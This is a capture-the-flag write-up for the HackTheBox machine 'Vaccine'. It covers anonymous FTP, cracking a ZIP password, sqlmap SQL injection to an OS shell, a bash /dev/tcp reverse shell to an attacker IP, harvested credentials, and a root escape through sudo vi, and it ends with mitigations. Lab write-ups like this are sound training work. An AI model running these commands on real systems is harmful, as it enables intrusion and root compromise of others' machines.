# Vaccine - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Vaccine |
| OS | Linux |
| Difficulty | Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-26 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Vaccine is a Linux machine that demonstrates a full compromise chain starting from anonymous FTP access. A password-protected backup archive was downloaded and cracked, exposing web credentials. SQL injection in the web application led to command execution and an initial shell as the `postgres` user. Privilege escalation was achieved through misconfigured sudo rights allowing `vi` execution on a PostgreSQL config file, which was abused to spawn a root shell.

---

## Reconnaissance

### Service Discovery

Initial enumeration identified the following exposed services:

- FTP (anonymous login enabled)
- HTTP (web application)
- SSH (open)

---

## Enumeration

### FTP Enumeration (Anonymous Login)

Connected to FTP anonymously:

```bash
ftp 10.129.95.174
```

Discovered and downloaded:

- `backup.zip`

### ZIP Password Cracking

The archive was password-protected.

Step 1 - Convert archive to hash:

```bash
zip2john backup.zip > hash.txt
```

Step 2 - Crack hash with John:

```bash
john hash.txt
```

Recovered ZIP password:

```text
qwerty789
```

### Web Application Access

Used recovered credentials to authenticate to the web portal:

- Username: `admin`
- Password: `qwerty789`

A search functionality was identified as a likely SQL injection point.

---

## Exploitation

### Vulnerability

**Category:** SQL Injection (Authentication/Query Handling Weakness)

**Description:**
Unsanitized input in the web application's search functionality allowed SQL injection against a PostgreSQL backend. Exploitation via SQLMap enabled OS-level command execution.

### SQLMap Exploitation

```bash
sqlmap -u http://10.129.95.174 --data="search=*" --method POST --dbs
```

Identified backend DBMS:

- PostgreSQL

Obtained shell capability:

```bash
sqlmap ... --os-shell
```

### Reverse Shell

Upgraded to a reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.17.48/443 0>&1"
```

Shell obtained as:

- `postgres`

---

## Post-Exploitation / Privilege Escalation

### User Flag

User-level access and flag location confirmed under:

```text
/var/lib/postgresql/
```

### Credential Discovery

Credentials were found in web application source:

```text
/var/www/html/dashboard.php
User: postgres
Password: P@s5w0rd!
```

### SSH Access as postgres

```bash
ssh postgres@10.129.95.174
```

Authenticated using:

- `P@s5w0rd!`

### Sudo Misconfiguration and Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

Found allowed command:

```text
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Abused `vi` to spawn a root shell:

```vim
:set shell=/bin/sh
:shell
```

Root access achieved successfully.

---

## Flags

| Flag | Value |
|------|-------|
| User flag | Retrieved from `/var/lib/postgresql/` |
| Root flag | Retrieved from `/root/` |

---

## Key Takeaways

- **What I learned:** Seemingly low-risk exposures like anonymous FTP can be the first critical link in a full compromise chain.
- **Password cracking matters:** Weak archive passwords (`qwerty789`) can expose credentials and accelerate compromise.
- **SQL injection impact:** SQLi can move beyond data extraction into command execution and full host compromise.
- **Privilege escalation risk:** Granting `vi` under sudo can be equivalent to full root access if shell escapes are possible.
- **Credential hygiene:** Hardcoded credentials in application files remain a common and high-impact weakness.
- **Techniques used:** Anonymous FTP enumeration, ZIP cracking with John, SQL injection with SQLMap, reverse shell upgrade, credential harvesting, sudo abuse via `vi`.
- **Tools used:** FTP client, `zip2john`, John the Ripper, SQLMap, SSH.
- **Mitigations:**
  - Disable anonymous FTP unless absolutely required.
  - Enforce strong passwords on archives and service accounts.
  - Use parameterized queries to eliminate SQL injection.
  - Remove dangerous sudo rules for interactive editors.
  - Avoid storing plaintext credentials in web-accessible application files.

---

## References

- https://app.hackthebox.com
- https://github.com/sqlmapproject/sqlmap
- https://www.openwall.com/john/
- https://gtfobins.github.io/
